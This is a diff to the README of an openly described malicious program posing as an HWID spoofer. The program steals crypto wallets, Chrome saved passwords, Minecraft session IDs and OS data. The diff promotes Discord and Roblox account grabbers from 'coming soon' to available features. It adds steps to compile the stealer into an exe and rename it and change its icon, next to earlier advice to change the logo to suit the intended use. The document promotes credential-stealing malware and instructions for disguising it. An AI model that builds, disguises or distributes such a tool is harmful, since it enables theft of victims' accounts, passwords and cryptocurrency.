@@ -12,15 +12,12 @@ This is a malicious tool, aimed to look like a HWID Spoofer. The program finds t
 - OS Data
 - Crypto Wallets
 - Minecraft SSID
+- Discord Account Grabber
+- Roblox Account Grabber
 - Chrome Saved Passwords <br>
 **Extras:** 
 - FTP Connection
 - Desktop Screenshot
-
-
-## Coming Soon
-- Discord Account Grabber
-- Roblox Account Grabber
 
 ## How To Run
 
@@ -37,6 +34,16 @@ This is a malicious tool, aimed to look like a HWID Spoofer. The program finds t
 **Note:** I Would recommend changing the logo to something that suits what you plan to use this for, 
           to do the big ascii text similar to what i did visit [patorjk.com](https://patorjk.com/software/taag/#p=display&f=Graffiti&t=Spin)
 
+## How To Compile
+
+1. **Run The build_exe.py** 
+    - And wait for it to fulyl complete.
+2. **Open The Dist Folder**
+    - Thats where your exe will be
+3. **Changing Name**
+    -To change the name of the exe, open the build_exe.py and change line 10.
+4. **Changing Icon**
+    -To change the icon of the exe, just replace the file named Icon.ico with what you desire. (Make sure its named Icon.ico)
 
 ## Dummy Log Images<br>
 
